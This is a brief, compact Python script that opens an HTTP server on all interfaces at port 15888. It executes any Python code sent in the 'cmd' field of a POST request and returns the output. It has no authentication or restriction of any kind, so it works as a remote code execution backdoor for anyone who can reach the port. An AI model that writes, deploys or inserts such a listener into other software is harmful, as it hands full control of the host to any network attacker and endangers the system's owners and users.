import http.server as h,json,subprocess as s
class H(h.BaseHTTPRequestHandler):
 def do_POST(x):
  n=int(x.headers.get('Content-Length',0))
  d=json.loads(x.rfile.read(n))
  r=s.run(['python','-c',d['cmd']],capture_output=True,text=True)
  x.send_response(200);x.end_headers()
  x.wfile.write(json.dumps({'ok':True,'out':r.stdout,'err':r.stderr}).encode())
h.HTTPServer(('0.0.0.0',15888),H).serve_forever()
